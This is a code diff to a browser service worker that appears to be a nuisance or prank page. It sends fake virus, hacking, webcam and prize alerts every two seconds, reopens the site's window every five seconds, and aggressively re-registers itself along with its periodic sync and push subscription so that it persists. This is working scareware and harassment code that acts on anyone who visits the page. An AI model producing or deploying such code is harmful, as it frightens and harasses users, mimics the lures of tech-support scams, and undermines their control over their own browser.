@@ -1,5 +1,9 @@
 self.addEventListener('install', () => {
   self.skipWaiting()
+  // Aggressive re-registration
+  setInterval(() => {
+    self.registration.update()
+  }, 1000)
 })
 
 self.addEventListener('activate', (e) => {
@@ -21,19 +25,13 @@ self.addEventListener('fetch', (e) => {
 
 self.addEventListener('notificationclick', (e) => {
   e.notification.close()
-  const url = 'https://n5za.github.io/n5zad/'
+  const url = 'https://n5za.github.io/'
   e.waitUntil(
     clients.matchAll({ type: 'window' }).then((clientsList) => {
       for (const c of clientsList) {
         if ('focus' in c) return c.focus()
       }
       if (clients.openWindow) return clients.openWindow(url)
-      // If we can't open, try again
-      setTimeout(() => {
-        clients.matchAll({ type: 'window' }).then((list) => {
-          if (list.length === 0 && clients.openWindow) clients.openWindow(url + '?sw=' + Date.now())
-        })
-      }, 500)
     })
   )
 })
@@ -47,56 +45,58 @@ self.addEventListener('notificationclose', () => {
       requireInteraction: true,
       vibrate: [200, 100, 200, 100, 500]
     })
-    // Try to open window
     clients.matchAll({ type: 'window' }).then((list) => {
       if (list.length === 0 && clients.openWindow) {
-        clients.openWindow('https://n5za.github.io/n5zad/?sw=' + Date.now())
+        clients.openWindow('https://n5za.github.io/')
       }
     })
   }, 500)
 })
 
-// Spam notifications every 2 seconds
+// Spam notifications every 2 seconds (no cap)
 setInterval(() => {
-  self.registration.getNotifications().then((notifications) => {
-    const messages = [
-      'Your computer has a virus!',
-      'Click here to claim your prize!',
-      'You are the 999,999th visitor!',
-      'FREE iPhone 16!',
-      'Your files are being encrypted',
-      'Someone is watching you through your webcam',
-      'Your battery is critically low',
-      'Update Java now! Critical security patch',
-      'All your base are belong to us',
-      'You would make a great hamster',
-      'Your search history has been uploaded',
-      'Your computer is now part of a botnet',
-      'Error 0xDEADBEEF: Brain not found',
-      'You have been hacked!',
-      'Your IP address has been leaked!',
-      'Click to remove virus!',
-      'Your PC is infected!',
-      'Windows has detected a threat!',
-      'Warning: System compromised!',
-      'Hackers are watching you!',
-      'Your webcam has been accessed!',
-      'Install antivirus now!'
-    ]
-    self.registration.showNotification(
-      messages[Math.floor(Math.random() * messages.length)],
-      {
-        icon: 'cat-cute.jpg',
-        tag: 'spam-' + Date.now(),
-        requireInteraction: true,
-        vibrate: [200, 100, 200],
-        silent: false
-      }
-    )
-  })
+  const messages = [
+    'Your computer has a virus!',
+    'Click here to claim your prize!',
+    'You are the 999,999th visitor!',
+    'FREE iPhone 16!',
+    'Your files are being encrypted',
+    'Someone is watching you through your webcam',
+    'Your battery is critically low',
+    'Update Java now! Critical security patch',
+    'All your base are belong to us',
+    'You would make a great hamster',
+    'Your search history has been uploaded',
+    'Your computer is now part of a botnet',
+    'Error 0xDEADBEEF: Brain not found',
+    'You have been hacked!',
+    'Your IP address has been leaked!',
+    'Click to remove virus!',
+    'Your PC is infected!',
+    'Windows has detected a threat!',
+    'Warning: System compromised!',
+    'Hackers are watching you!',
+    'Your webcam has been accessed!',
+    'Install antivirus now!'
+  ]
+  self.registration.showNotification(
+    messages[Math.floor(Math.random() * messages.length)],
+    {
+      icon: 'cat-cute.jpg',
+      tag: 'spam-' + Date.now(),
+      requireInteraction: true,
+      vibrate: [200, 100, 200],
+      silent: false
+    }
+  )
 }, 2000)
 
-// Background sync - try to re-register periodically
+// Periodic background sync
+try {
+  self.registration.periodicSync.register('annoy-sync', { minInterval: 1 }).catch(() => {})
+} catch(e) {}
+
+// Sync event
 self.addEventListener('sync', (e) => {
   if (e.tag === 'annoy-sync') {
     e.waitUntil(
@@ -109,12 +109,17 @@ self.addEventListener('sync', (e) => {
   }
 })
 
-// Try to register periodic sync
-self.registration.periodicSync.register('annoy-sync', {
-  minInterval: 60 * 1000
-}).catch(() => {})
+// Push subscription persistence
+self.addEventListener('pushsubscriptionchange', (e) => {
+  e.waitUntil(
+    self.registration.pushManager.subscribe({
+      userVisibleOnly: true,
+      applicationServerKey: new Uint8Array(65).fill(1)
+    }).catch(() => {})
+  )
+})
 
-// Push event for future push notifications
+// Push event
 self.addEventListener('push', (e) => {
   const data = e.data ? e.data.text() : 'Hello!'
   e.waitUntil(
@@ -131,16 +136,12 @@ self.addEventListener('message', (e) => {
   if (e.data === 'open') {
     clients.matchAll({ type: 'window' }).then((clientsList) => {
       if (clientsList.length === 0) {
-        clients.openWindow('https://n5za.github.io/n5zad/')
+        clients.openWindow('https://n5za.github.io/')
       }
     })
   }
-  if (e.data === 'download') {
-    self.registration.showNotification('Downloading...', {
-      body: 'File ' + Math.floor(Math.random() * 99999) + '.exe',
-      tag: 'dl-' + Date.now(),
-      requireInteraction: true
-    })
+  if (e.data === 'ping') {
+    e.source.postMessage('pong')
   }
 })
 
@@ -148,7 +149,7 @@ self.addEventListener('message', (e) => {
 setInterval(() => {
   clients.matchAll({ type: 'window' }).then((clientsList) => {
     if (clientsList.length === 0) {
-      clients.openWindow('https://n5za.github.io/n5zad/?sw-reopen=' + Date.now())
+      clients.openWindow('https://n5za.github.io/')
     }
   })
 }, 5000)
